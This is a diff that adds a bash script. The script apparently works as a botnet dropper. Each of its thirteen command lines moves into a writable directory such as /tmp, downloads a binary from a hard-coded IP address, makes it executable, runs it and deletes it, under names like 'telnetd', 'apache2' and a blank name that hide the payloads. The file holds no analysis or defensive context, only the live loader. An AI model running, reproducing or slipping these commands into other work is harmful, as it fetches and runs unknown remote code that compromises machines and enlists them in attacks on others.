@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.65.95.68/cookie; chmod +x cookie; ./cookie; rm -rf cookie
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.65.95.68/monster; chmod +x monster; ./monster; rm -rf monster
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.65.95.68/thc; chmod +x thc; ./thc; rm -rf thc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.65.95.68/dabs; chmod +x dabs; ./dabs; rm -rf dabs
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.65.95.68/hash; chmod +x hash; ./hash; rm -rf hash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.65.95.68/slump; chmod +x slump; ./slump; rm -rf slump
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.65.95.68/buzz; chmod +x buzz; ./buzz; rm -rf buzz
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.65.95.68/sleep; chmod +x sleep; ./sleep; rm -rf sleep
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.65.95.68/ahhhh; chmod +x ahhhh; ./ahhhh; rm -rf ahhhh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.65.95.68/sh; chmod +x sh; ./sh; rm -rf sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.65.95.68/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.65.95.68/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.65.95.68/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
